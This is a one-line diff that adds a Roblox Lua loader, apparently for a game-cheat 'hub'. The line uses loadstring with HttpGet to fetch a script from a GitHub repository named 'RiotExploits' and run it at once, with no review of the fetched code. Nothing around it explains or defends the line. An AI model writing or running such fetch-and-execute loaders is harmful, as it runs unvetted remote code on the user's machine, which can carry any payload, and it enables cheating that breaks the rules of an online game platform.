@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Riotscripter/RiotExploits/main/Dragon%20Blox%20Hub'))()
